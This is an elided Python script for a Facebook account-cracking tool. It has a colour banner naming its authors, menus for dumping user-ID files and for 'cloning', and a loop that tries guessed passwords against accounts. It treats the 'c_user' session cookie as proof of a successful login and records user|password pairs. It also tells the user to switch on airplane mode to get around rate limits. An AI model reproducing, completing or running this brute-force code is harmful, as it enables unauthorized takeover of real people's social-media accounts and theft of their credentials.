...
\033[0;93m   __    _  _  ___ 
\033[0;93m  /__\  ( )/ )/ __)
\033[0;96m /(__)\  )  (( (_-.
\033[0;96m(__)(__)(_)\_)\___/
 
 
\033[0;93m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
\033[0;91mAUTHOR   : TOOR  AKG
 
\033[0;93mFACEBOOK : NAZIR KHAN
 
\033[0;96mGITHUB   : GUSTAH5
...
def sarfraz():
    ...
    todz = ''
    IP = ipm['origin'] 
    print('\033[0;91m[✘] THIS TOOLS ONLY DATA USER WORKING') 
    print('\033[0;93m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~')
    print('\033[0;94m[1] START FILE CLONING')
    print('\033[0;95m[2] DUMP FILE MAKE')
    print('\033[0;91m[3] EXIT')
    print('\033[0;96m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~')
    _sarfraz___ = input('\033[0;92m[?] CHOOSE OPTION : ')
...
class __xxx__:
    ...
    def sarfrazx(self,id):
        ...
        print(logo)
        print('\033[0;93m--------------------------------------------------')
        print('\033[0;91mWARNING TYPE /sdcard/file nazir.txt')
        print('\033[0;96m--------------------------------------------------')
        self.cnt = input('\033[0;92mPUT FILE NAME : ')
    ...
    def __metode__(self, user, __chi__, cebok):
        global ok,cp,loop
        sys.stdout.write(f"\r\x1b[1;95m[TOOR-AJMAL] {loop} | {len(self.id)} \033[0;92mOK-{len(ok)} / \033[0;91mCP-{len(cp)} ")
        sys.stdout.flush()
        try:
            for pw in __chi__:
                pw = pw.lower()
                ...
                if 'c_user' in session.cookies.get_dict():
                    ...
                    try:
                        ...
                        print('\r%s[TKG-CP] %s | %s ' % (M, user, pw))
                        wrt = '%s|%s' % (user,pw)
                        cp.append(wrt)
    ...
    def __pler__(self):
        print('\033[1;33m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~')
        print('\033[1;31m[1] CRACK WITH AUTO PASS ')
        print('\033[1;34m[2] CRACK WITH NAME DIGIT PASS') 
        print('\033[1;36m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~')
        chi = input('\n\033[1;32m[?] CHOOSE : ')
        if chi == '':
            print('\nSELECT CORRECT ONE')
            ...
            os.system("clear")
            print(logo)
            print('\033[1;32mTURN ON \033[1;31mAIRPLANE \033[1;32mMODE 5 SECONDS')
            print('\033[1;33m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~')
            print('\033[1;32m[✔︎] TOTAL IDS : %s ' % len(self.id))
            print('\033[1;31m[✔︎] CRACKING STARTED.....') 
            print('\033[1;34m[✘] TO STOP PROCESS PRESS CTRL+Z')
            print('\033[1;36m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~')
